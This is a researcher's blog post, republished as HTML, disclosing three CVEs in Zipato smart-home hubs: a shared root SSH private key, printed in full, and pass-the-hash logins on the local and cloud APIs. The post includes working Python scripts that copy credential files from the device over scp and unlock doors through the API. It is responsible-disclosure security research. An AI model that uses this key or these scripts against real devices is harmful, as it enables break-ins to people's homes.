@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Breaking &amp; Entering with Zipato SmartHubs</title>
+    <meta name="description" content="Breaking &amp; Entering with Zipato SmartHubs using Pass-The-Hash vulnerability to unlock doors remotely." />
+    <link rel="stylesheet" href="../assets/css/blog.css" />
+  </head>
+  <body>
+    <header class="masthead">
+      <div class="masthead__inner">
+        <div class="brand">
+          <a class="brand__link" href="../index.html">Charles Dardaman</a>
+          <p class="brand__tagline">Security engineering, incident response, research.</p>
+        </div>
+        <nav class="site-nav" aria-label="Primary">
+          <ul>
+            <li><a href="../index.html#about">About</a></li>
+            <li><a href="../index.html#writing">Writing</a></li>
+            <li><a href="../index.html#connect">Connect</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <header class="post-header">
+      <h1>Breaking &amp; Entering with Zipato SmartHubs</h1>
+      <p><time datetime="2019-07-02">July 2, 2019</time></p>
+    </header>
+
+    <main>
+      <article>
+        <p><em>This article was originally published at <a href="https://blackmarble.sh/zipato-smart-hub/" target="_blank" rel="noopener">https://blackmarble.sh/zipato-smart-hub/</a> and is duplicated here for posterity.</em></p>
+
+        <figure>
+          <video controls preload="metadata">
+            <source src="../images/smarthub.mp4" type="video/mp4" />
+            Your browser does not support the video tag.
+          </video>
+          <figcaption>Demonstration of the Zipato SmartHub attack chain.</figcaption>
+        </figure>
+
+        <h2 id="researcher-contact-information">Researcher Contact Information</h2>
+        <table>
+          <thead>
+            <tr>
+              <th scope="col">Name</th>
+              <th scope="col">Contact</th>
+              <th scope="col">Role</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Charles Dardaman</td>
+              <td><a href="https://twitter.com/CharlesDardaman" target="_blank" rel="noopener">@CharlesDardaman</a></td>
+              <td>Reverse Engineered API</td>
+            </tr>
+            <tr>
+              <td>INIT_6</td>
+              <td><a href="https://twitter.com/INIT_3" target="_blank" rel="noopener">@INIT_3</a></td>
+              <td>Discovered Root SSH Key</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2 id="executive-summary">Executive Summary</h2>
+        <p>During the 0DAYALLDAY Research Event three vulnerabilities were discovered in the ZipaMicro Z-Wave Controller Model #: <strong>ZM.ZWUS</strong> and the Zipabox Z-Wave Controller Model #: <strong>2AAU7-ZBZWUS</strong>. Two vulnerabilities are in the design and implementation of the authentication mechanism in the Zipato Application Programming Interface (API). The third vulnerability is embedded SSH private key for ROOT which is not unique and can be extracted.</p>
+
+        <h2 id="approach">Approach</h2>
+        <p>When we first got our hands on the smart lock and hub we thought of attacking it in three different scenarios. First, could we unlock the door remotely without having access to anything beforehand. Second, if we were an apartment resident with this solution could we take data off the device in order to unlock all the other residents' front doors. Lastly, could we find a vulnerability or misconfiguration that would allow an attacker to unlock the door on the same network. During our research we were able to prove that two of these methods of attack were viable and if we had more time might have proven all three to be feasible.</p>
+
+        <h2 id="product-description">Product Description</h2>
+        <p>The Zipato ZM.ZWUS ZipaMicro Z-Wave controller is the smallest controller in Zipato's line of Z-Wave controllers. It is used to manage and control Z-Wave and IP devices remotely. Vendor product page can be found <a href="https://www.zipato.com/product/zipamicro" target="_blank" rel="noopener">here</a>.</p>
+        <p>The Zipato 2AAU7-ZBZWUS Zipabox Z-Wave controller is their module based controller allowing for additional modules to be attached. It is used to manage and control Z-Wave, IP devices, among other modules that can be attached remotely. Vendor product page can be found <a href="https://www.zipato.com/product/zipabox2" target="_blank" rel="noopener">here</a>.</p>
+
+        <h2 id="findings-overview">Findings Overview</h2>
+        <p>This section summarizes the strategic problems identified, risk ratings, and recommendations. The Detailed Testing section describes the attempted attacks, evidence (including screenshots), risk ratings, and potential solutions.</p>
+        <p>The results from this testing as well as any additional details regarding any further exposure can be found in the Detailed Testing section.</p>
+        <table>
+          <tbody>
+            <tr>
+              <th scope="row">Device</th>
+              <td>Zipato ZM.ZWUS ZipaMicro Z-Wave controller</td>
+            </tr>
+          </tbody>
+        </table>
+        <table>
+          <thead>
+            <tr>
+              <th scope="col">Finding</th>
+              <th scope="col">Risk Rating</th>
+              <th scope="col">Remediation Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Embedded SSH Private key for ROOT</td>
+              <td>CRITICAL</td>
+              <td>Vulnerable</td>
+            </tr>
+            <tr>
+              <td>Pass-the-Hash Local API Authentication</td>
+              <td>CRITICAL</td>
+              <td>Vulnerable</td>
+            </tr>
+            <tr>
+              <td>Pass-the-Hash Remote API Authentication</td>
+              <td>CRITICAL</td>
+              <td>Vulnerable</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2 id="detailed-technical-description">Detailed Technical Description</h2>
+
+        <h3 id="embedded-ssh-private-key-for-root-cve-2019-9560">Embedded SSH Private key for ROOT (CVE-2019-9560)</h3>
+        <p>The SSH key was found by removing the SD Card from the device and imaging the SD Card. The SSH key was found in <code>/etc/dropbear/</code> with the name <code>dropbear_rsa_host_key</code> which is password protected when using this format but you can still extract the private and public key.</p>
+        <pre><code>init6@FBI:/media/multimedia/0DayAllDay/zipato-smarthub$ ssh -i dropbear_rsa_host_key root@192.168.6.60
+Enter passphrase for key 'dropbear_rsa_host_key':
+</code></pre>
+        <p>Extracting the private key with the <code>dropbearconvert</code> tool:</p>
+        <pre><code>init6@FBI:/media/multimedia/0DayAllDay/zipato-smarthub$ /usr/lib/dropbear/dropbearconvert dropbear openssh dropbear_rsa_host_key zipato_id_rsa
+Key is a ssh-rsa key
+Wrote key to 'zipato_id_rsa'
+</code></pre>
+        <p>Private key:</p>
+        <pre><code>-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAr44ZVxiXQR3TZ87An2c0n27ZwEvgftLhQtvZ+klNqgXCso39
+ZuCRItaw/wZ3WISwskwCvzCev4Di50Qsww6+sUaBoJU4KXuZi8LWzJHJ5zDnDa9c
+PArIfg3wZM0UlHIAqb0wm1YWAqFd7jTTATTmXKMQccgk3shEYbHvqZnR5RReuD/b
+5LzxkRzndmJ2te1cCYBH3xcj6T78sFNuHj5DByd2CgaQje+Un8WkUqxfRVT2d9/Y
+vlaRXx0Qpz7Gk0+JqPpVdos8a6Ws0dka9nhJXAy8fGhYCz0xoIjBXw1+XZCSO/OD
+J6saR9DeT2WlJw1OUmTj73DbtRw7fegWpDfLRwIDAQABAoIBAAyeHkzNPqnLy/2t
+CtkqIMpzZtZ/CElKki2CVwi51gl/VSliMoaqDfm+toVN4KwNtWl13x4AukLcr5zx
+oHSl4vzOKtObhf2CnbGW37tfoG8BFnTnAq5qE/5DYDYj1fPUEcohXT9SO6Nqwlve
+6L+FyXzPrNyQsbMKxSdvE4umu5hG9M1WfnqJglH4rI7WDT6lgbt7+nMsCTGeTsR7
+Wvv1eHGR8sanTaEV/Xt5G2MjGI4Xvrux/vm4jvFno2I2DDj0IOmtaQkDij861aNE
+B+xV7XuAW6ruDc37XkdHunnGNZWmkGCdoI7IvzRMfpHWwmZG1zPyFtXZfarycrIe
+0ndD3sECgYEAuoyS6jL/OVcN7DhIPe8NJcc3P4GY38TetsS9QtkqqdhxV37KX5Ge
+Kyr7IeAm1jO1TYfQ1EK3jtR+f/wNnrgh34LUnIZ00ND+X7FS52WndVzeCR+Fh48Z
+RJDqR+rb2Ia/jEEbQXrOFXYs4vcy+WfvQ5ZSWR9JAoxWKinalvGp52cCgYEA8Om3
+bN1Y8m0XmBVA5T3JM6/Zg0/KAhv2BM3QpBHWXKLL/CBq7xNrMlb1N49Rd9SAXVVA
+mfBVOQl5QdpzrERzXWtaDr/UvCSj4m9wMrZg88273viS2IbNJ0Tz59OhCv1OKyUA
+OsTL4avGpS8TC4+ocRWtaVHQTQG1eXvTbDMf8SECgYEAkKkUAGMdgdSdKlIWy1hG
+BMawdCHGb7gV0PtNnLoVGHKMqgHbYzLjyavh5MoSs8aTUJUCfqdh+nOTySGnWi6F
+rfKhduPZUFjQ+Vnj5SbyLdOfJsn33UA9ousRkkVwyD7t6RBP134os4HZmwOA1uEf
+LHU0VIIrNrum0bl1Fdo/G/8CgYBkhgElic7diSu5J9UmUnur94pZQmfWLXigVIjk
+jRTXHo7jK1uzWnT2UlaL0l96Es9lIneMRD4rSIqyMcbmcMF6j5rKYL0RrHA9waYd
+YwBdetETnsEXXFgqNJlZeHLQNRXy5sOLwiYYiiafMl9OCamNVjA/rAWwvC/O+x4j
+HcoMQQKBgQCe0ahjyz9pCMMsmNITUVGeujFExkj1KwzVgBxFDO6yRUhl0T7U7xiH
+8VPAyM0/7jhj9zrGhwINMLIsiAAgmKdBY+k2vUfuOJxUQsQB+WmucZAJSZ0xhRnB
+b98phTSt+TGayvOSDc1x7wli4wyZPhIo6mEMc6DKY+hrZKbFQkFtEQ==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+        <p>Extracting the public key with the <code>dropbearkey</code> tool:</p>
+        <pre><code>init6@FBI:/media/multimedia/0DayAllDay/zipato-smarthub$ dropbearkey -y -f dropbear_rsa_host_key | grep "^ssh-rsa " &gt; zipato_id_rsa.pub
+</code></pre>
+        <p>The public key matched the public key in <code>/home/root/.ssh/authorized_keys</code>.</p>
+        <p>Login with the new extracted private key:</p>
+        <pre><code>init6@FBI:/media/multimedia/0DayAllDay/zipato-smarthub$ ssh -i zipato_id_rsa root@192.168.6.60
+root@zipaMicro:~# whoami
+root
+</code></pre>
+
+        <h3 id="pass-the-hash-local-api-authentication-cve-2019-9561">Pass-the-Hash Local API Authentication (CVE-2019-9561)</h3>
+        <p>User data is stored in <code>/mnt/data/zipato/storage/USERS</code>:</p>
+        <pre><code>root@zipaMicro:/mnt/data/zipato/storage/USERS# ls -lah
+drwxr-xr-x    4 root     root        4.0K Feb 23 22:12 .
+drwxr-xr-x    9 root     root        4.0K Feb 23 22:12 ..
+drwxr-xr-x    2 root     root        4.0K Feb 23 18:24 0a5ad19e-ec0f-4a17-b314-5dd328ab913d
+drwxr-xr-x    2 root     root        4.0K Feb 23 22:12 a9a6328f-f4d5-4f8f-b724-ee30ebb85594
+-rw-r--r--    1 root     root         173 Feb 23 22:07 object.json
+</code></pre>
+        <p>Inside each user is an <code>object.json</code> file which includes the SHA1 password hash.</p>
+        <pre><code>{
+    "className": "com.zipato.runtime.BoxUser",
+    "uuid": "0a5ad19e-ec0f-4a17-b314-5dd328ab913d",
+    "name": "Users Email Account",
+    "cv": 0,
+    "sv": 0,
+    "deleted": true,
+    "locked": false,
+    "nd": true,
+    "tags": null,
+    "order": null,
+    "master": true,
+    "duress": false,
+    "alias": null,
+    "password": "Users SHA1 Password",
+    "number": 1,
+    "pinSalt": null,
+    "pinToken": null,
+    "activeRoles": ["owner", "wallet", "global_cache", "philips_hue", "nest", "brand_limit", "sonos"]
+}
+</code></pre>
+        <p>After looking at the Zipato API documentation we can build our authentication request without having to crack the password hash.</p>
+        <p>First it is required to get the nonce by sending a GET request to the <code>/user/init</code> endpoint.</p>
+        <figure>
+          <img src="../images/user-init.png" alt="Screenshot of the user init request showing the returned nonce" />
+        </figure>
+        <p>Next to login you need to create a token <code>SHA1(nonce + SHA1(password))</code>. Since we already have the <code>SHA1(password)</code> we can just pass the hash from the <code>object.json</code> file.</p>
+        <figure>
+          <img src="../images/user-login.png" alt="Screenshot of the user login request showing the constructed token" />
+        </figure>
+        <p>Once authenticated you can send the door unlock request by sending a PUT request to the API endpoint <code>/v2/attributes/&lt;uuid&gt;/value</code> where the UUID is the Z-Wave lock object. This UUID can be found in the file located at <code>/mnt/data/zipato/storage/attributes.json</code>.</p>
+        <p>The PUT payload to open the lock is <code>{"value":"false"}</code>.</p>
+        <p>To lock the door you set <code>value</code> to <code>"true"</code>.</p>
+        <p>Proof-of-concept script:</p>
+        <pre><code class="language-python">#Written by Charles Dardaman
+
+import requests
+import hashlib
+import sys
+import os
+import json
+import subprocess
+import logging
+
+#Grab passwords and UUIDS
+print("Stealing the files")
+
+#trying with scp
+
+#Grabbing files needed for UUID
+cmd = "scp -i key root@" + sys.argv[1] + ":/mnt/data/zipato/storage/attributes.json ."
+return_code = subprocess.call(cmd, shell=True)
+if return_code != 0:
+    print("Files not found")
+    sys.exit()
+
+#Grabbing files needed for token
+cmd = "scp -r -i key root@" + sys.argv[1] + ":/mnt/data/zipato/storage/USERS/ ."
+return_code = subprocess.call(cmd, shell=True)
+if return_code != 0:
+    print("Files not found")
+    sys.exit()
+
+#Open the files to parse the json to get the UUID, Username, and Password
+
+print("Forging Keys")
+
+with open("attributes.json") as f:
+    data = json.load(f)
+    for key in data:
+        if key["name"] == "STATE":
+            uuid = key["uuid"]
+            print(uuid)
+
+#Try for all the users
+for root,dirs,files in os.walk("USERS"):
+    for name in files:
+        userpath = root + "/" + name
+        with open(userpath) as f:
+            data = json.load(f)
+            try:
+                username = data["name"]
+                password = data["password"]
+                print(username)
+                print(password)
+            except:
+                break
+
+            print("Building Crowbar")
+
+            #Get nonce
+            r = requests.get("http://" + sys.argv[1] + ":8080/v2/user/init")
+
+            data = json.loads(r.text)
+            nonce = data["nonce"]
+            print("Nonce= " + nonce)
+            jessionid = data["jsessionid"]
+            cookies = {"JSESSIONID": jessionid}
+
+            #SHA work SHA1(nonce+password=token)
+            np = nonce + password
+            print(np)
+
+            hash_object = hashlib.sha1(np.encode())
+            token = hash_object.hexdigest()
+            print("token: "+ token)
+
+            #Send Login Request
+            r = requests.get("http://" + sys.argv[1] + ":8080/v2/user/login?username="+username+"&amp;token="+token,cookies=cookies)
+
+            print(r.text)
+            data = json.loads(r.text)
+
+            if data["success"] != "true":
+                print("Pure Failure")
+
+            #Send Open
+            r = requests.put("http://" + sys.argv[1] + ":8080/v2/attributes/"+uuid+"/value",cookies=cookies,json={"value":"true"})
+
+            print(r.text)
+            print("Door Opened")
+</code></pre>
+
+        <h3 id="pass-the-hash-remote-api-authentication-cve-2019-9562">Pass-the-Hash Remote API Authentication (CVE-2019-9562)</h3>
+        <p>The remote API has the same pass-the-hash vulnerability as the local API. Depending on the Zipato implementation it could be possible to control all the ZipatoMicro devices. For example, [REDACTED] implementation has 3 usable credentials. Master account owned by [REDACTED], master account for the apartment complex, and an account for the renter. Because of this it is possible to control all the devices on the [REDACTED]'s network.</p>
+        <p>Proof-of-concept script:</p>
+        <pre><code class="language-python">#Written by Charles Dardaman
+#INIT_6 Adapted Charles' script for attacking the remote api.
+
+import requests
+import hashlib
+import sys
+import os
+import json
+import subprocess
+import logging
+import argparse
+
+def run(username, password, lock):
+    url = "https://my.zipato.com/zipato-web/v2"
+
+    print("Building Crowbar")
+    #Get nonce
+    r = requests.get(url + "/user/init")
+
+    data = json.loads(r.text)
+    nonce = data["nonce"]
+    print("Nonce: %s" % (nonce) )
+
+    jessionid = data["jsessionid"]
+    cookies = {"JSESSIONID": jessionid}
+
+    #SHA work SHA1(nonce+password=token)
+    np = nonce + password
+    print("nonce + password: %s " % (np) )
+
+    hash_object = hashlib.sha1(np.encode())
+    token = hash_object.hexdigest()
+    print("token: %s" % (token) )
+
+    #Send Login Request
+    r = requests.get(url + "/user/login?username="+username+"&amp;token="+token,cookies=cookies)
+
+    print(r.text)
+    data = json.loads(r.text)
+
+    if not data["success"]:
+        print("Pure Failure")
+
+    # Get Users
+    r = requests.get(url + "/users", cookies=cookies)
+    users = json.loads(r.text)
+
+    # Get Devices
+    r = requests.get(url + "/devices", cookies=cookies)
+    devices = json.loads(r.text)
+
+    # Get all device endpoints and search for Door locks, get all door lock endpoints STATE attributes and then either lock or unlock the doors.
+    door_lock_endpoints = []
+    device_uuids = []
+    for device in devices:
+        if 'uuid' in device.keys():
+            device_uuids.append(device['uuid'])
+
+    for uuid in device_uuids:
+        r = requests.get(url + "/devices/"+uuid+"/endpoints",cookies=cookies)
+        data = json.loads(r.text)
+        if data:
+            r = requests.get(url + "/endpoints/"+data[0]['uuid']+"?attributes=true",cookies=cookies)
+            data = json.loads(r.text)
+            if 'Door Lock' in data['name']:
+                for attribute in data['attributes']:
+                    if attribute['name'] == 'STATE':
+                        door_lock_endpoints.append(attribute['uuid'])
+
+    if door_lock_endpoints:
+        for uuid in door_lock_endpoints:
+            if lock:
+                r = requests.put(url + "/attributes/"+uuid+"/value",cookies=cookies,json={"value":"true"})
+                print("Door Locked")
+            else:
+                r = requests.put(url + "/attributes/"+uuid+"/value",cookies=cookies,json={"value":"false"})
+                print("Door Opened")
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="Zipato API\nAll Your Houses are belong to us...",epilog=None)
+    parser.add_argument("-u","--username",help="Zipato Username",type=str,required=True)
+    parser.add_argument("-p","--password",help="Zipato SHA1 Password Hash",type=str,required=True)
+    parser.add_argument("--lock",help="Lock Doors",action='store_true')
+    parser.add_argument("--unlock",help="Unlock Doors",action='store_true')
+
+    opt = parser.parse_args()
+    #Lock = True or unlock = False
+    #Fail closed for security.
+    try:
+        if opt.lock:
+            lock = True
+        elif opt.unlock:
+            lock = False
+        else:
+            lock = False
+    except:
+        lock = False
+
+    run(opt.username, opt.password, lock)
+</code></pre>
+
+        <p><strong>Zipato's Response</strong></p>
+        <figure>
+          <img src="../images/Zipato-Email2.png" alt="Screenshot of Zipato's email response" />
+        </figure>
+        <p>Their documentation has not changed, so passing the hash is still an issue if you can find the password hash.</p>
+
+        <p><strong>Informational Findings</strong></p>
+        <p>Searching for the RSA fingerprint on Shodan.io found five Zipato Micro devices directly on the Internet.</p>
+        <figure>
+          <img src="../images/dropbear-on-internet.png" alt="Screenshot of Shodan results showing dropbear exposed on the internet" />
+        </figure>
+
+        <h2 id="disclosure-timeline">Disclosure Timeline</h2>
+        <ul>
+          <li>Sat, Feb 23, 2019: Issue discovered at 0DayAllDay Research Event</li>
+          <li>Mon, Mar 4, 2019: Issue disclosed to vendor</li>
+          <li>Mon, Mar 4, 2019: CVE-2019-9560, CVE-2019-9561, and CVE-2019-9562 reserved</li>
+          <li>Wed, Mar 20, 2019: Zipato responded saying issues were fixed</li>
+          <li>Tue, Jul 2, 2019: Public disclosure</li>
+        </ul>
+
+        <h3 id="special-thanks">Special Thanks</h3>
+        <ul>
+          <li>Everyone at the 0DayAllDay Hacking Event!</li>
+          <li><a href="https://geniusden.com/" target="_blank" rel="noopener">GeniusDen</a> for hosting our event</li>
+          <li><a href="https://twitter.com/TinkerSec" target="_blank" rel="noopener">@TinkerSec</a> financier of underground criminal empire.</li>
+          <li>Andrew McPherran <a href="https://twitter.com/andrewmcpherran" target="_blank" rel="noopener">@andrewmcpherran</a> for verifying [REDACTED] deployment</li>
+          <li>Ramsey <a href="https://twitter.com/Sec00000101" target="_blank" rel="noopener">@Sec00000101</a> for verifying [REDACTED] deployment</li>
+          <li>Lesley Carhart <a href="https://twitter.com/hacks4pancakes" target="_blank" rel="noopener">@hacks4pancakes</a> for drawing our attention to these types of targets. She has a great talk that can be found on <a href="https://www.youtube.com/watch?v=74w0w6iUKEA" target="_blank" rel="noopener">YouTube</a>. Also check out her blog posts <a href="https://tisiphone.net/2019/01/28/security-things-to-consider-when-your-apartment-goes-smart/" target="_blank" rel="noopener">here</a> and <a href="https://tisiphone.net/2019/03/03/life-moves-fast-smart-apartment-style/" target="_blank" rel="noopener">here</a>.</li>
+        </ul>
+      </article>
+      <div class="footer">
+        <a href="../index.html">← Back to homepage</a>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <p>&copy; <span id="current-year"></span> Charles Dardaman</p>
+    </footer>
+
+    <script>
+      const year = new Date().getFullYear();
+      document.getElementById("current-year").textContent = year;
+    </script>
+  </body>
+</html>
